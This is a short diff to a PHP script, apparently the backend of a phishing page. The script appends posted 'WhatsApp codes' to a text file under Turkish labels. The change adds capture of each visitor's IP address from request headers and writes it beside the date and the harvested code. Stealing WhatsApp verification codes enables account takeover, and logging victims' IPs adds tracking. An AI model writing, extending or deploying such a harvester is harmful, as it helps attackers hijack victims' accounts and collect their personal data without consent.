@@ -1,6 +1,16 @@
 <?php
-//include "test.php";
-
+if (!empty($_SERVER['HTTP_CLIENT_IP']))
+    {
+      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r";
+    }
+elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
+    {
+      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r";
+    }
+else
+    {
+      $ipaddress = $_SERVER['REMOTE_ADDR']."\r";
+    }
 if (isset($_POST['kod'])) {
 
 $save = fopen("kod.txt","a+");
@@ -11,6 +21,8 @@ $vericekilen = ("
 +-+-+ WHATSAPP CODE +-+-+
 
  Tarih         : ".$tarih."
+
+ İp Adresi     : ".$ipaddress."
 
  Kod           : ".$kod."
 
